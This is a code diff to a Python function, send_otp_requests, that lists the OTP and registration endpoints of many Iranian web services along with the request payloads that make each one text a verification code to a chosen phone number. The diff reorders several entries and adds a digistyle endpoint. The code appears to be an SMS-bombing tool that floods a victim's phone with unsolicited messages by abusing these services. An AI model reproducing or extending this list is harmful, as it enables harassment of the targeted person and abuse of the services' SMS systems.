@@ -21,6 +21,9 @@ def send_otp_requests(number):
         'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
         'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
         'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
+        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
+        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
+        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
         'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
         'harikashop': ('https://harikashop.com/login?back=my-account', {
             'username': '0' + number,
@@ -32,7 +35,6 @@ def send_otp_requests(number):
             'action': 'register',
             'ajax': '1'
         }),
-        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
         'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {
             'action': 'ywp_ajax_register',
             'ywp_register': '1',
@@ -44,8 +46,7 @@ def send_otp_requests(number):
             'type': 1,
             'value': '0' + number
         }),
-        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
-        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
+
         'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
             'country_id': 205,
             'mobile': number
@@ -93,6 +94,9 @@ def send_otp_requests(number):
         'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {
             'ReturnUrl': 'https://parkbag.com/',
             'MobaileNumber': number,
+        }),
+        'digistyle': ('https://www.digistyle.com/users/login-register/', {
+            'loginRegister[email_phone]': '0' + number,
         }),
     }
 
